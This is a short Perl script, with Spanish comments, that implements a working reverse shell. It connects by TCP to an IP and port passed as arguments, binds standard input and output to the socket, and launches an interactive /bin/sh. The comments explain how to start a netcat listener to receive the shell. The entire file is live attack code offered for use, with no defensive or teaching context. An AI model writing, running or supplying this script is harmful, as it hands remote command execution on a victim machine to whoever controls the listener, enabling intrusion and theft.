#!/usr/bin/perl -w
use Socket;
my $i = $ARGV[0];
my $p = $ARGV[1];

#invocar usando comando.pl "ip-maquina-local" "port-maquina-local"
#y en maquina local en terminal usar nc -lvp "port-maquina-local"

socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN, ">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i ");
};
